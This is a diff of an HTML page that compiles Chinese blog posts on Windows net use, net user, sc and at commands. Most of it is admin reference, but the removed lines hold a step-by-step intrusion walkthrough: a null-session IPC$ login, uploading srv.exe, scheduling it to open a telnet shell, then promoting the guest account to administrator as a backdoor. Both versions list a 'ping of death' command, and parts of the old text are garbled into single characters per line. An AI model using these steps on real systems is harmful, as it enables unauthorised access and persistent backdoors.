@@ -6,589 +6,337 @@
     <title>github网页</title>
 </head>
 <body>
-    net use命令详解
-         用net use命令可以查看你当前与网络资源的连接，例如驱动器映射、IPC连接。使用该命令后，应该可以看到你和有资源连接。然后可以用net use * /del /y命令中断开所有连接。最后，你再次访问，应该就不会有这个提示了
-
- 
-
-Net Use 命令用法
-公司共享服务器有两种文件目录：其一：对外文件目录；其二：对内文件目录（只能通过域登录才能有权访问）
-
-但是，使用域登录不习惯的我，也为了避免老是注销当前系统切换到域帐户登录的麻烦，于是想到了NET USE 命令，它可以帮助我不注销系统也能访问“域”目录。以下请参考NET USE命令详解。
-
-（本案例用到的NET USE格式：net use 服务器的被访问目录 /user:域名称\域登录账号。例子：我现在用本机用户登录操作系统的，但是希望能够访问域的文件夹，步骤如下：
-
-1）删除已有的连接，避免出现“一个用户使用...多重连接”的问题。
-
-net use * /delete
-
-如果提示“列表是空的”，表示当前没有任何关联连接；如果提示“您有如下远程连接... 继续运行会取消连接”，输入“Y”或者“y”
-
-2）通过net use命令登录域里（获取权限的过程），以达到正常访问域的目的。
-
-net use \\192.168.54.x\行政部\行政部内部文件夹 /user:jiesai\zhuyongfeng
-
-注意：命令中的空格及斜杠要求
-
-3）如果要求提供密码，输入域登录密码即可。
-
-NET USE 用于将计算机与共享的资源相连接，或者切断计算机与共享资源的连接。当不带选项使用本命令时，它会列出计算机的连接。
-
-　　这个命令的使用格式如下:
-
-NET USE
-[devicename | *] [\\computername\sharename[\volume] [password | *]]
-[/USER:[domainname\]username]
-[/USER:[dotted domain name\]username]
-[/USER:[username@dotted domain name]
-[/SMARTCARD]
-[/SAVECRED]
-[[/DELETE] | [/PERSISTENT:{YES | NO}]] 
-　　DeviceName:指派名称以便连接到资源或指定断开的设备。有两种类型的设备名: 磁盘驱动器号(即 D: 到 Z:} 和打印机(即 LPT1:到 LPT3:}。如果键入星号而不是特定设备名，则系统会指派下一个可用的设备名。这个名称以后可以作为访问共享资源的名称进行引用。
-
-　　\\computername:指控制共享资源的计算机的名字。如果计算机名中包含有空字符，就要将双反斜线 (\\) 和计算机名一起用引号 (" ")括起来。计算机名可以有1 到 15 个 字符。\volume :指定一个服务器上的NetWare卷。用户必须安装 Netware 的客户服务 (Windows 工作站) 或者 Netware 的网关服务(Windows 服务器) 并使之与 NetWare 服务器相连。
-
-　　Password:指定访问共享资源所需的密码。输入星号 (*) 产生一个密码提示在密码提示行处键入密码时不显示密码。
-
-　　/user:在其后指定建立连接时使用的不同于目前登录用户的用户名。
-
-　　DomainName:指定不同于目前登录域的其他域。如果省略则net use使用当前登录的域。
-
-　　注意，/user:后的登录用户和域可以有三种不同的表示形式，分别为domainname\username，dotted domain name\username和username@dotted domain name，其中dotted domain name提指域名的全称，如office.yesky.com，也即域名加域后缀的完全形式。
-
-　　/SAVECRED:指定保留用户名和密码。除非命令提示输入用户名和密码。否则此开关被忽略，
-
-　　/SMARTCARD:指定连接使用在智能卡上的凭据。
-
-　　/delete:取消指定的网络连接。如果使用星号 (*) 指定连接，则所有网络连接均将取消。
-
-　　/persistent:{yes | no}:控制持久网络连接的使用。默认值为最后一次使用的设置。非设备连接不会持久。Yes 将按其建立时的原样保存所有连接，并在下次登录时还原它们。No 则不保存已建立的连接或后续连接。现存的连接在下一次登录时还原。使用 /delete 删除持久连接。
-
-　　Net use命令还有另两种使用格式，分别如下:
-
-　　NET USE {devicename | *} [password | *] /HOME
-
-　　NET USE [/PERSISTENT:{YES | NO}]
-
-　　其中第一种命令格式将用户连到其域的主目录并将主目录映射为设备名DeviceName。后一种格式用来修改持久连接的使用。
-
-　　下面是两个例子:
-
-　　要连接用户标识符 Dan 就好像是通过 Accounts 域创建的连接:
-
-　　net use d:\\server\share /user:Accounts\Dan
-
-　　要断开 \\Financial\Public 目录:
-
-　　net use f:\\financial\public /delete
-
-net use命令详解 net use \\ip\ipc$ " " /user:" " 建立IPC空链接
-
-net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接 
-
-net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
-
-net use h: \\ip\c$ 登陆后映射对方C：到本地为H: 
-
-net use \\ip\ipc$ /del 删除IPC链接 
-
-net use h: /del 删除映射对方到本地的为H:的映射 
-
-net user 用户名　密码　/add 建立用户 
-
-net user guest /active:yes 激活guest用户 
-
-net user 查看有哪些用户 
-
-net user 帐户名 查看帐户的属性 
-
-net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数 
-
-net start 查看开启了哪些服务 
-
-net start 服务名　 开启服务；(如:net start telnet， net start schedule) 
-
-net stop 服务名 停止某服务 
-
-net time \\目标ip 查看对方时间 
-
-net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 
-
-net view 查看本地局域网内开启了哪些共享 
-
-net view \\ip 查看对方局域网内开启了哪些共享 
-
-net config 显示系统网络设置 
-
-net logoff 断开连接的共享 
-
-net pause 服务名 暂停某服务 
-
-net send ip "文本信息" 向对方发信息 
-
-net ver 局域网内正在使用的网络连接嘈秃托畔 
-
-net share 查看本地开启的共享 
-
-net share ipc
-开
-启
-i
-p
-c
- 共享
-
-net share ipc
-/
-d
-e
-l
-删
-除
-i
-p
-c
- 共享
-
-net share c$ /del 删除C：共享
-
-net user guest 12345 用guest用户登陆后用将密码改为12345 
-
-net password 密码 更改系统登陆密码 
-
-netstat -a 查看开启了哪些端口,常用netstat -an 
-
-netstat -n 查看端口的网络连接情况，常用netstat -an 
-
-netstat -v 查看正在进行的工作 
-
-netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
-
-netstat -s 查看正在使用的所有协议使用情况 
-
-nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
-
-tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 
-
-ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 
-
-ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) 
-
-ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 
-
-tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
-
-kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
-
-del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件
-
- 
-
-出处：https://blog.csdn.net/zhao12795969/article/details/52813366
-
-=======================================================================================
-
-NET USE命令
-NET USE命令
-注：需要workstation服务支持
-
-获取当前IPC连接列表
-net use
-
-建立远程IPC连接
-net use \192.168.1.118\ipc$ “Password” /user:“UserName”
-
-删除指定IPC连接
-net use \192.168.1.118\ipc$ /del
-
-删除所有IPC连接
-net use * /del
-
-创建映射分区
-net use z: \192.168.1.118 \c
-
-删除映射分区
-net use z: /del
-
-复制文件到远程主机
-copy c:\script.bat \192.168.1.118\c$
-
-添加计划任务到远程主机
-at \192.168.1.118 09:00 c:\script.bat
-
-NET USER用户操作命令
-
-在本地添加帐户
-net user 帐户名 密码 /add
-
-激活禁用的用户
-net uesr 帐户名 /active:yes
-
-加入管理员组
-net localgroup administrators 帐户名 /add
-
-远程关机
-
-重启 shutdown /m \192.168.1.118 /r /t 0
-关机 shutdown /m \192.168.1.118 /s /t 0
-
-SC 服务操作命令
-
-创建服务
-sc create ServiceName binPath= " c:\script.bat\ " start= demand
-设置服务为手动状态
-sc \192.168.1.118 config RemoteRegistry start= demand
-
-启动服务
-sc \192.168.1.118 start RemoteRegistry
-结束服务
-sc \192.168.1.118 stop RemoteRegistry
-删除服务
-sc \192.168.1.118 delete RemoteRegistry
-
-删除默认共享
-net share c$ /delete
-
-禁止自动打开默认共享
-Server版本
-[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]
-把AutoShareServer（DWORD）的键值改为:00000000
-
-Workstation版本
-[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]
-把AutoShareWks（DWORD）的键值改为:00000000
-
-IPC连接基于139，445端口
-
-139端口可以通过禁止NBT来屏蔽
-本地连接－TCP/IT属性－高级－WINS－选 禁用TCP/IT上的NETBIOS
-
-445端口可以通过修改注册表来屏蔽
-添加一个键值
-Hive: HKEY_LOCAL_MACHINE
-Key: System\Controlset\Services\NetBT\Parameters
-Name: SMBDeviceEnabled
-Type: REG_DWORD
-Value: 0
-
-远程重启服务器
-shutdown /r /f /m \192.168.10.251 /t 0
-
- 
-
-出处：https://blog.51cto.com/u_491033/2352953
-
-=======================================================================================
-
-net use命令详解
-1)建立空连接: 
-
-net use \\IP\ipc$ "" /user:"" (一定要注意:这一行命令中包含了3个空格) 
-
- 
-
-2)建立非空连接: 
-
-net use \\IP\ipc$ "密码" /user:"用户名" (同样有3个空格) 
-
- 
-
-3)映射默认共享: 
-
-net use z: \\IP\c$ "密码" /user:"用户名" (即可将对方的c盘映射为自己的z盘，其他盘类推) 
-
-如果已经和目标建立了ipc
-，
-则
-可
-以
-直
-接
-用
-I
-P
-+
-盘
-符
-+
-访问,具体命令 net use z: \\IP\c$ 
-
- 
-
-4)删除一个ipc$连接 
-
-net use \\IP\ipc$ /del 
-
- 
-
-5)删除共享映射 
-
-net use c: /del 删除映射的c盘，其他盘类推 
-
-net use * /del 删除全部,会有提示要求按y确认 
-
- 
-
-3 查看远程主机的共享资源（但看不到默认共享） 
-
-net view \\IP 
-
- 
-
-4 查看本地主机的共享资源（可以看到本地的默认共享） 
-
-net share 
-
- 
-
-5 得到远程主机的用户名列表 
-
-nbtstat -A IP 
-
- 
-
-6 得到本地主机的用户列表 
-
-net user 
-
- 
-
-7 查看远程主机的当前时间 
-
-net time \\IP 
-
- 
-
-8 显示本地主机当前服务 
-
-net start 
-
- 
-
-9 启动/关闭本地服务 
-
-net start 服务名 /y 
-
-net stop 服务名 /y 
-
- 
-
-10 映射远程共享: 
-
-net use z: \\IP\baby 
-
-此命令将共享名为baby的共享资源映射到z盘 
-
- 
-
-11 删除共享映射 
-
-net use c: /del 删除映射的c盘，其他盘类推 
-
-net use * /del /y删除全部 
-
- 
-
-12 向远程主机复制文件 
-
-copy \路径\srv.exe \\IP\共享目录名，如： 
-
-copy ccbirds.exe \\*.*.*.*\c 即将当前目录下的文件复制到对方c盘内 
-
- 
-
-13 远程添加计划任务 
-
-at \\ip 时间 程序名，如： 
-
-at \\127.0.0.0 11:00 love.exe 
-
-注意：时间尽量使用24小时制；在系统默认搜索路径（比如system32/）下不用加路径，否则必须加全路径 
-
-14 开启远程主机的telnet 
-
-这里要用到一个小程序：opentelnet.exe，各大下载站点都有，而且还需要满足四个要求： 
-
- 
-
-1）目标开启了ipc$共享 
-
-2）你要拥有管理员密码和帐号 
-
-3）目标开启RemoteRegistry服务，用户就该ntlm认证 
-
-4）对WIN2K/XP有效，NT未经测试 
-
-命令格式：OpenTelnet.exe \\server account psw NTLM认证方式 port 
-
-试例如下：c:\>OpenTelnet.exe \\*.*.*.* administrator "" 1 90 
-
- 
-
-15 激活用户/加入管理员组 
-
-1 net uesr account /active:yes 
-
-2 net localgroup administrators account /add 
-
- 
-
-16 关闭远程主机的telnet 
-
-同样需要一个小程序：ResumeTelnet.exe 
-
-命令格式：ResumeTelnet.exe \\server account psw 
-
-试例如下：c:\>ResumeTelnet.exe \\*.*.*.* administrator "" 
-
- 
-
-17 删除一个已建立的ipc$连接 
-
-net use \\IP\ipc$ /del 
-
- 
-
-九 经典入侵模式 
-
-这个入侵模式太经典了,大部分ipc教程都有介绍,我也就拿过来引用了,在此感谢原创作者!(不知道是哪位前辈) 
-
- 
-
-1. C:\>net use \\127.0.0.1\IPC$ "" /user:"admintitrators" 
-
-这是用《流光》扫到的用户名是administrators，密码为"空"的IP地址(空口令?哇,运气好到家了)，如果是打算攻击的话，就可以用这样的命令来与127.0.0.1建立一个连接，因为密码为"空"，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入administrators，命令即可成功完成。 
-
-复制之前务必用net view \\IP这个命令看一下对方的共享情况 
-
-2. C:\>copy srv.exe \\127.0.0.1\admin$ 
-
-先复制srv.exe上去，在流光的Tools目录下就有（这里的
-是
-指
-a
-d
-m
-i
-n
-用
-户
-的
-c
-:
-\winnt
-\system
-32
-\，
-大
-家
-还
-可
-以
-使
-用
-c
-、d$，意思是C盘与D盘，这看你要复制到什么地方去了）。 
-
- 
-
-3. C:\>net time \\127.0.0.1 
-
-查查时间，发现127.0.0.1 的当前时间是 2002/3/19 上午 11:00，命令成功完成。 
-
- 
-
-4. C:\>at \\127.0.0.1 11:05 srv.exe 
-
-用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！） 
-
- 
-
-5. C:\>net time \\127.0.0.1 
-
-再查查到时间没有？如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备开始下面的命令。 
-
- 
-
-6. C:\>telnet 127.0.0.1 99 
-
-这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的Shell。 
-
-虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了 
-
- 
-
-7.C:\>copy ntlm.exe \\127.0.0.1\admin$ 
-
-用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。 
-
- 
-
-8. C:\WINNT\system32>ntlm 
-
-输入ntlm启动（这里的C:\WINNT\system32>指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行）。当出现"DONE"的时候，就说明已经启动正常。然后使用"net start telnet"来开启Telnet服务！ 
-
- 
-
-9. Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作一样简单！(然后你想做什么?想做什么就做什么吧,哈哈) 
-
- 
-
-为了以防万一,我们再把guest激活加到管理组 
-
-10. C:\>net user guest /active:yes 
-
-将对方的Guest用户激活 
-
- 
-
-11. C:\>net user guest 1234 
-
-将Guest的密码改为1234,或者你要设定的密码 
-
- 
-
-12. C:\>net localgroup administrators guest /add 
-
-将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机) 
-
- 
-
-另外,你也可以根据返回的错误号分析原因： 
-
- 
-
-错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限； 
-
-错误号51，Windows无法找到网络路径：网络有问题； 
-
-错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； 
-
-错误号67，找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$； 
-
-错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连； 
-
-错误号1326，未知的用户名或错误密码：原因很明显了； 
-
-错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动； 
-
-错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码
-
-    在使用这种方法屏蔽网络映射功能时，只需要先打开系统的运行对话框，并在其中执行“cmd”字符串命令，将系统界面切换到MS-DOS命令行状态；接着在DOS提示符下执行“net use x：/del”字符串命令，就能将网络磁盘分区为“X”的网络映射连接断开了，要想快速地将本地计算机中所有的网络映射连接断开的话，只需要执行“net use * /del”字符串命令就可以了。
-
- 
-
-出处：https://www.cnblogs.com/mamiyiya777/p/11017875.html
-
-=======================================================================================
-
-WINDOWS2003（或其他的windows服务器）在局域网共享文件时，有时候测试的时候要更换登陆的用户名。使用NET USE 命令可以方便处理。
-
-1）删除已有的连接，避免出现“一个用户使用...多重连接”的问题。
-net use * /delete
-
-如果提示“列表是空的”，表示当前没有任何关联连接；如果提示“您有如下远程连接... 继续运行会取消连接”，输入“Y”或者“y”
-
-
+   <h2>Net Use 命令用法</h2>
+<div>
+<p>公司共享服务器有两种文件目录：其一：对外文件目录；其二：对内文件目录（只能通过域登录才能有权访问）</p>
+<p>但是，使用域登录不习惯的我，也为了避免老是注销当前系统切换到域帐户登录的麻烦，于是想到了NET USE 命令，它可以帮助我不注销系统也能访问“域”目录。以下请参考NET USE命令详解。</p>
+<p>（本案例用到的NET USE格式：net use 服务器的被访问目录 /user:域名称\域登录账号。例子：我现在用本机用户登录<a class="replace_word" style="color: rgba(223, 52, 52, 1); text-decoration: none; font-weight: bold" title="操作系统知识库" href="http://lib.csdn.net/base/operatingsystem" rel="noopener" target="_blank">操作系统</a>的，但是希望能够访问域的文件夹，步骤如下：</p>
+<p>1）删除已有的连接，避免出现“一个用户使用...多重连接”的问题。</p>
+<p>net use * /delete</p>
+<p>如果提示“列表是空的”，表示当前没有任何关联连接；如果提示“您有如下远程连接... 继续运行会取消连接”，输入“Y”或者“y”</p>
+<p>2）通过net use命令登录域里（获取权限的过程），以达到正常访问域的目的。</p>
+<p>net use \\192.168.54.x\行政部\行政部内部文件夹 /user:jiesai\zhuyongfeng</p>
+<p>注意：命令中的空格及斜杠要求</p>
+<p>3）如果要求提供密码，输入域登录密码即可。</p>
+<p>NET USE 用于将计算机与共享的资源相连接，或者切断计算机与共享资源的连接。当不带选项使用本命令时，它会列出计算机的连接。</p>
+<p>　　这个命令的使用格式如下:</p>
+<p>NET USE<br> [devicename | *] [\\computername\sharename[\volume] [password | *]]<br> [/USER:[domainname\]username]<br> [/USER:[dotted domain name\]username]<br> [/USER:[username@dotted domain name]<br> [/SMARTCARD]<br> [/SAVECRED]<br> [[/DELETE] | [/PERSISTENT:{YES | NO}]]&nbsp;<br> </p>
+<p>　　DeviceName:指派名称以便连接到资源或指定断开的设备。有两种类型的设备名: 磁盘驱动器号(即 D: 到 Z:} 和打印机(即 LPT1:到 LPT3:}。如果键入星号而不是特定设备名，则系统会指派下一个可用的设备名。这个名称以后可以作为访问共享资源的名称进行引用。</p>
+<p>　　\\computername:指控制共享资源的计算机的名字。如果计算机名中包含有空字符，就要将双反斜线 (\\) 和计算机名一起用引号 (" ")括起来。计算机名可以有1 到 15 个 字符。\volume :指定一个服务器上的NetWare卷。用户必须安装 Netware 的客户服务 (Windows 工作站) 或者 Netware 的网关服务(Windows 服务器) 并使之与 NetWare 服务器相连。</p>
+<p>　　Password:指定访问共享资源所需的密码。输入星号 (*) 产生一个密码提示在密码提示行处键入密码时不显示密码。</p>
+<p>　　/user:在其后指定建立连接时使用的不同于目前登录用户的用户名。</p>
+<p>　　DomainName:指定不同于目前登录域的其他域。如果省略则net use使用当前登录的域。</p>
+<p>　　注意，/user:后的登录用户和域可以有三种不同的表示形式，分别为domainname\username，dotted domain name\username和username@dotted domain name，其中dotted domain name提指域名的全称，如office.yesky.com，也即域名加域后缀的完全形式。</p>
+<p>　　/SAVECRED:指定保留用户名和密码。除非命令提示输入用户名和密码。否则此开关被忽略，</p>
+<p>　　/SMARTCARD:指定连接使用在智能卡上的凭据。</p>
+<p>　　/delete:取消指定的网络连接。如果使用星号 (*) 指定连接，则所有网络连接均将取消。</p>
+<p>　　/persistent:{yes | no}:控制持久网络连接的使用。默认值为最后一次使用的设置。非设备连接不会持久。Yes 将按其建立时的原样保存所有连接，并在下次登录时还原它们。No 则不保存已建立的连接或后续连接。现存的连接在下一次登录时还原。使用 /delete 删除持久连接。</p>
+<p>　　Net use命令还有另两种使用格式，分别如下:</p>
+<p>　　NET USE {devicename | *} [password | *] /HOME</p>
+<p>　　NET USE [/PERSISTENT:{YES | NO}]</p>
+<p>　　其中第一种命令格式将用户连到其域的主目录并将主目录映射为设备名DeviceName。后一种格式用来修改持久连接的使用。</p>
+<p>　　下面是两个例子:</p>
+<p>　　要连接用户标识符 Dan 就好像是通过 Accounts 域创建的连接:</p>
+<p>　　net use d:\\server\share /user:Accounts\Dan</p>
+<p>　　要断开 \\Financial\Public 目录:</p>
+<p>　　net use f:\\financial\public /delete</p>
+<p>net use命令详解 net use \\ip\ipc$ " " /user:" " 建立IPC空链接</p>
+<p> net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接&nbsp;</p>
+<p> net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:&nbsp;</p>
+<p> net use h: \\ip\c$ 登陆后映射对方C：到本地为H:&nbsp;</p>
+<p> net use \\ip\ipc$ /del 删除IPC链接&nbsp;</p>
+<p> net use h: /del 删除映射对方到本地的为H:的映射&nbsp;</p>
+<p> net user 用户名　密码　/add 建立用户&nbsp;</p>
+<p> net user guest /active:yes 激活guest用户&nbsp;</p>
+<p> net user 查看有哪些用户&nbsp;</p>
+<p> net user 帐户名 查看帐户的属性&nbsp;</p>
+<p> net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数&nbsp;</p>
+<p> net start 查看开启了哪些服务&nbsp;</p>
+<p> net start 服务名　 开启服务；(如:net start telnet， net start schedule)&nbsp;</p>
+<p> net stop 服务名 停止某服务&nbsp;</p>
+<p> net time \\目标ip 查看对方时间&nbsp;</p>
+<p> net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息&nbsp;</p>
+<p> net view 查看本地局域网内开启了哪些共享&nbsp;</p>
+<p> net view \\ip 查看对方局域网内开启了哪些共享&nbsp;</p>
+<p> net config 显示系统网络设置&nbsp;</p>
+<p> net logoff 断开连接的共享&nbsp;</p>
+<p> net pause 服务名 暂停某服务&nbsp;</p>
+<p> net send ip "文本信息" 向对方发信息&nbsp;</p>
+<p> net ver 局域网内正在使用的网络连接嘈秃托畔&nbsp;</p>
+<p> net share 查看本地开启的共享&nbsp;</p>
+<p> net share ipc$ 开启ipc$ 共享</p>
+<p> net share ipc$ /del 删除ipc$ 共享</p>
+<p> net share c$ /del 删除C：共享</p>
+<p> net user guest 12345 用guest用户登陆后用将密码改为12345&nbsp;</p>
+<p> net password 密码 更改系统登陆密码&nbsp;</p>
+<p> netstat -a 查看开启了哪些端口,常用netstat -an&nbsp;</p>
+<p> netstat -n 查看端口的网络连接情况，常用netstat -an&nbsp;</p>
+<p> netstat -v 查看正在进行的工作&nbsp;</p>
+<p> netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）&nbsp;</p>
+<p> netstat -s 查看正在使用的所有协议使用情况&nbsp;</p>
+<p> nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写&nbsp;</p>
+<p> tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。&nbsp;</p>
+<p> ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。&nbsp;</p>
+<p> ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)&nbsp;</p>
+<p> ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息&nbsp;</p>
+<p> tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)&nbsp;</p>
+<p> kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)&nbsp;</p>
+<p> del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件</p>
+</div>
+</div>
+<p>&nbsp;</p>
+<p>出处：https://blog.csdn.net/zhao12795969/article/details/52813366</p>
+<p>=======================================================================================</p>
+<div id="markdownContent" class="con artical-content editor-preview-side">
+<h1>NET USE命令</h1>
+<p>NET USE命令<br>
+注：需要workstation服务支持</p>
+<p>获取当前IPC连接列表<br>
+net use</p>
+<p>建立远程IPC连接<br>
+net use \192.168.1.118\ipc$ “Password” /user:“UserName”</p>
+<p>删除指定IPC连接<br>
+net use \192.168.1.118\ipc$ /del</p>
+<p>删除所有IPC连接<br>
+net use * /del</p>
+<p>创建映射分区<br>
+net use z: \192.168.1.118 \c</p>
+<p>删除映射分区<br>
+net use z: /del</p>
+<p>复制文件到远程主机<br>
+copy c:\script.bat \192.168.1.118\c$</p>
+<p>添加计划任务到远程主机<br>
+at \192.168.1.118 09:00 c:\script.bat</p>
+<p>NET USER用户操作命令</p>
+<p>在本地添加帐户<br>
+net user 帐户名 密码 /add</p>
+<p>激活禁用的用户<br>
+net uesr 帐户名 /active:yes</p>
+<p>加入管理员组<br>
+net localgroup administrators 帐户名 /add</p>
+<p>远程关机</p>
+<p>重启 shutdown /m \192.168.1.118 /r /t 0<br>
+关机 shutdown /m \192.168.1.118 /s /t 0</p>
+<p>SC 服务操作命令</p>
+<p>创建服务<br>
+sc create ServiceName binPath= " c:\script.bat\  " start= demand<br>
+设置服务为手动状态<br>
+sc \192.168.1.118 config RemoteRegistry start= demand</p>
+<p>启动服务<br>
+sc \192.168.1.118 start RemoteRegistry<br>
+结束服务<br>
+sc \192.168.1.118 stop RemoteRegistry<br>
+删除服务<br>
+sc \192.168.1.118 delete RemoteRegistry</p>
+<p>删除默认共享<br>
+net share c$ /delete</p>
+<p>禁止自动打开默认共享<br>
+Server版本<br>
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]<br>
+把AutoShareServer（DWORD）的键值改为:00000000</p>
+<p>Workstation版本<br>
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]<br>
+把AutoShareWks（DWORD）的键值改为:00000000</p>
+<p>IPC连接基于139，445端口</p>
+<p>139端口可以通过禁止NBT来屏蔽<br>
+本地连接－TCP/IT属性－高级－WINS－选 禁用TCP/IT上的NETBIOS</p>
+<p>445端口可以通过修改注册表来屏蔽<br>
+添加一个键值<br>
+Hive: HKEY_LOCAL_MACHINE<br>
+Key: System\Controlset\Services\NetBT\Parameters<br>
+Name: SMBDeviceEnabled<br>
+Type: REG_DWORD<br>
+Value: 0</p>
+<p>远程重启服务器<br>
+shutdown /r /f /m \192.168.10.251 /t 0</p>
+
+</div>
+<p>&nbsp;</p>
+<p>出处：https://blog.51cto.com/u_491033/2352953</p>
+<p>=======================================================================================</p>
+<h1>net use命令详解</h1>
+<p>1)建立空连接:&nbsp;</p>
+<p>net use \\IP\ipc$ "" /user:"" (一定要注意:这一行命令中包含了3个空格)&nbsp;</p>
+<p>&nbsp;</p>
+<p>2)建立非空连接:&nbsp;</p>
+<p>net use \\IP\ipc$ "密码" /user:"用户名" (同样有3个空格)&nbsp;</p>
+<p>&nbsp;</p>
+<p>3)映射默认共享:&nbsp;</p>
+<p>net use z: \\IP\c$ "密码" /user:"用户名" (即可将对方的c盘映射为自己的z盘，其他盘类推)&nbsp;</p>
+<p>如果已经和目标建立了ipc$，则可以直接用IP+盘符+$访问,具体命令 net use z: \\IP\c$&nbsp;</p>
+<p>&nbsp;</p>
+<p>4)删除一个ipc$连接&nbsp;</p>
+<p>net use \\IP\ipc$ /del&nbsp;</p>
+<p>&nbsp;</p>
+<p>5)删除共享映射&nbsp;</p>
+<p>net use c: /del 删除映射的c盘，其他盘类推&nbsp;</p>
+<p>net use * /del 删除全部,会有提示要求按y确认&nbsp;</p>
+<p>&nbsp;</p>
+<p>3 查看远程主机的共享资源（但看不到默认共享）&nbsp;</p>
+<p>net view \\IP&nbsp;</p>
+<p>&nbsp;</p>
+<p>4 查看本地主机的共享资源（可以看到本地的默认共享）&nbsp;</p>
+<p>net share&nbsp;</p>
+<p>&nbsp;</p>
+<p>5 得到远程主机的用户名列表&nbsp;</p>
+<p>nbtstat -A IP&nbsp;</p>
+<p>&nbsp;</p>
+<p>6 得到本地主机的用户列表&nbsp;</p>
+<p>net user&nbsp;</p>
+<p>&nbsp;</p>
+<p>7 查看远程主机的当前时间&nbsp;</p>
+<p>net time \\IP&nbsp;</p>
+<p>&nbsp;</p>
+<p>8 显示本地主机当前服务&nbsp;</p>
+<p>net start&nbsp;</p>
+<p>&nbsp;</p>
+<p>9 启动/关闭本地服务&nbsp;</p>
+<p>net start 服务名 /y&nbsp;</p>
+<p>net stop 服务名 /y&nbsp;</p>
+<p>&nbsp;</p>
+<p>10 映射远程共享:&nbsp;</p>
+<p>net use z: \\IP\baby&nbsp;</p>
+<p>此命令将共享名为baby的共享资源映射到z盘&nbsp;</p>
+<p>&nbsp;</p>
+<p>11 删除共享映射&nbsp;</p>
+<p>net use c: /del 删除映射的c盘，其他盘类推&nbsp;</p>
+<p>net use * /del /y删除全部&nbsp;</p>
+<p>&nbsp;</p>
+<p>12 向远程主机复制文件&nbsp;</p>
+<p>copy \路径\srv.exe \\IP\共享目录名，如：&nbsp;</p>
+<p>copy ccbirds.exe \\*.*.*.*\c 即将当前目录下的文件复制到对方c盘内&nbsp;</p>
+<p>&nbsp;</p>
+<p>13 远程添加计划任务&nbsp;</p>
+<p>at \\ip 时间 程序名，如：&nbsp;</p>
+<p>at \\127.0.0.0 11:00 love.exe&nbsp;</p>
